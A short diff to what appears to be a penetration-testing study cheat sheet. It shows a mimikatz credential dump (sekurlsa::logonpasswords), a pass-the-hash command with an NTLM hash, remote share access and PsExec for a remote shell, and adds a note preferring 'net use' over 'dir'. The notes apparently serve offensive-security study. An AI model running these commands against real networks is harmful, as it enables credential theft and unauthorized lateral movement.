@@ -4837,7 +4837,10 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 klist
+# dir command caused problems during studying. net use worked.
 dir \\<RHOST>\<SHARE>
+# or
+net use \\<RHOST>
 klist
 .\PsExec.exe \\<RHOST> cmd
 ```
